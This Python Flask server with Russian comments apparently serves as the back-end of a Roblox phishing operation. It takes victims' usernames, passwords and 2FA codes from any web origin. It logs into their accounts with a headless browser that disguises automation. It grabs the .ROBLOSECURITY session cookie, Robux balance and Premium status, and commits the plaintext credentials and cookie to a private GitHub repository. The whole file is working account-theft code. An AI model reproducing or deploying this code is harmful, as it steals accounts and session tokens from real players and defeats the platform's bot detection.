import os
import logging
import random
import string
import time
import socket
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
import git
import json

app = Flask(__name__)


# КОНФИГУРАЦИЯ
ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"  # Замените на ваш репозиторий
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
MAX_LOGIN_ATTEMPTS = 3
REQUEST_TIMEOUT = 30


# НАСТРОЙКА ЛОГГИРОВАНИЯ
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
def get_chrome_options():
    """Возвращает настройки для Chrome"""
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 115)}.0.0.0 Safari/537.36")
    return options

def generate_filename():
    """Генерирует имя файла для сохранения данных"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"account_{timestamp}_{rand_str}.json"

def init_repository():
    """Инициализирует или обновляет git репозиторий"""
    try:
        if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
            repo = git.Repo(ORDERS_DIR)
            repo.git.pull()
            logger.info("Репозиторий успешно обновлен")
        else:
            if os.path.exists(ORDERS_DIR):
                for item in os.listdir(ORDERS_DIR):
                    if item != '.git':
                        os.remove(os.path.join(ORDERS_DIR, item))
            
            repo_url = f"https://{os.getenv('GITHUB_USERNAME')}:{os.getenv('GITHUB_TOKEN')}@{ORDERS_REPO.split('https://')[1]}"
            git.Repo.clone_from(repo_url, ORDERS_DIR)
            logger.info("Репозиторий успешно клонирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка работы с репозиторием: {str(e)}")
        return False

def save_account_data(data):
    """Сохраняет данные аккаунта в репозиторий"""
    try:
        if not init_repository():
            return False
        
        filename = generate_filename()
        filepath = os.path.join(ORDERS_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        repo = git.Repo(ORDERS_DIR)
        repo.git.add(filepath)
        repo.index.commit(f"Add account {filename}")
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Данные сохранены в {filename}")
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения данных: {str(e)}")
        return False

def human_like_delay(min_sec=0.1, max_sec=0.5):
    """Имитирует человеческую задержку"""
    time.sleep(random.uniform(min_sec, max_sec))

def simulate_human_interaction(driver):
    """Имитирует человеческое поведение"""
    try:
        # Случайные движения мышью
        actions = ActionChains(driver)
        actions.move_by_offset(random.randint(-20, 20), random.randint(-20, 20)).perform()
        human_like_delay()
        
        # Случайный скролл
        scroll_amount = random.randint(100, 300) * (1 if random.random() > 0.5 else -1)
        driver.execute_script(f"window.scrollBy(0, {scroll_amount});")
        human_like_delay()
        
        # Антидетект
        driver.execute_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5]
            });
        """)
    except Exception as e:
        logger.warning(f"Ошибка имитации поведения: {str(e)}")


# ОСНОВНАЯ ЛОГИКА БОТА
def process_login(username, password, code_2fa=None):
    """Обрабатывает вход в аккаунт"""
    driver = None
    try:
        # Инициализация драйвера
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=get_chrome_options())
        
        # Настройка браузера
        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
            "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
        })
        
        # Открытие страницы входа
        driver.get("https://www.roblox.com/login")
        human_like_delay(1, 2)
        
        # Закрытие cookie-баннера (если есть)
        try:
            cookie_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept') or contains(., 'Принять')]")))
            cookie_btn.click()
            human_like_delay()
        except:
            pass
        
        # Ввод данных
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-username")))
        username_field.send_keys(username)
        human_like_delay()
        
        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)
        human_like_delay()
        
        # Клик по кнопке входа
        login_btn = driver.find_element(By.ID, "login-button")
        login_btn.click()
        human_like_delay(1, 2)
        
        # Проверка на 2FA
        if code_2fa:
            try:
                code_field = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                code_field.send_keys(code_2fa)
                human_like_delay()
                
                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify') or contains(., 'Подтвердить')]")
                submit_btn.click()
                human_like_delay(2, 3)
            except Exception as e:
                return {'status': '2fa_error', 'message': f'2FA processing failed: {str(e)}'}
        
        # Проверка успешного входа
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container') or contains(@class, 'user-info')]")))
            
            # Сбор данных аккаунта
            account_data = {
                'username': username,
                'password': password,
                'status': 'active',
                'robux': get_robux_balance(driver),
                'premium': check_premium_status(driver),
                'cookie': driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else None,
                'timestamp': datetime.now().isoformat()
            }
            
            return {'status': 'success', 'data': account_data}
            
        except TimeoutException:
            # Проверка ошибок
            error_msg = check_for_errors(driver)
            if error_msg:
                return {'status': 'error', 'message': error_msg}
            
            return {'status': 'unknown_error', 'message': 'Unknown login error'}
            
    except Exception as e:
        logger.error(f"Critical error: {str(e)}")
        return {'status': 'critical_error', 'message': str(e)}
    finally:
        if driver:
            driver.quit()

def get_robux_balance(driver):
    """Получает баланс Robux"""
    try:
        driver.get("https://www.roblox.com/transactions")
        balance = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'robux-balance')]"))).text
        return balance.strip()
    except:
        return "0"

def check_premium_status(driver):
    """Проверяет наличие Premium"""
    try:
        driver.get("https://www.roblox.com/premium/membership")
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'premium-icon')]")))
        return True
    except:
        return False

def check_for_errors(driver):
    """Проверяет наличие сообщений об ошибках"""
    error_messages = [
        "incorrect username or password",
        "неверное имя пользователя или пароль",
        "account locked",
        "требуется проверка",
        "verification required"
    ]
    
    page_text = driver.page_source.lower()
    for msg in error_messages:
        if msg in page_text:
            return msg.capitalize()
    
    return None


# API ENDPOINTS
@app.route('/process_login', methods=['POST'])
def handle_login():
    """Обрабатывает запрос на вход"""
    # Добавляем CORS заголовки
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', '*')
        response.headers.add('Access-Control-Allow-Methods', '*')
        return response

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
    
    logger.info(f"Processing login for: {username}")
    result = process_login(username, password)
    
    response = jsonify(result)
    response.headers.add('Access-Control-Allow-Origin', '*')
    
    if result['status'] == 'success':
        if not save_account_data(result['data']):
            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
    
    return response

@app.route('/submit_2fa', methods=['POST'])
def handle_2fa():
    """Обрабатывает 2FA код"""
    # Добавляем CORS заголовки
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', '*')
        response.headers.add('Access-Control-Allow-Methods', '*')
        return response

    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    
    code = data.get('code')
    username = data.get('username')
    password = data.get('password')
    
    if not all([code, username, password]):
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    logger.info(f"Processing 2FA for: {username}")
    result = process_login(username, password, code)
    
    response = jsonify(result)
    response.headers.add('Access-Control-Allow-Origin', '*')
    
    if result['status'] == 'success':
        if not save_account_data(result['data']):
            return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
    
    return response

@app.route('/health', methods=['GET'])
def health_check():
    """Проверка работоспособности сервиса"""
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

# ЗАПУСК СЕРВЕРА
if __name__ == '__main__':
    # Проверка переменных окружения
    required_env_vars = ['GITHUB_USERNAME', 'GITHUB_TOKEN']
    for var in required_env_vars:
        if not os.getenv(var):
            logger.error(f"Missing required environment variable: {var}")
            exit(1)
    
    # Создание необходимых директорий
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    
    # Запуск сервера
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)

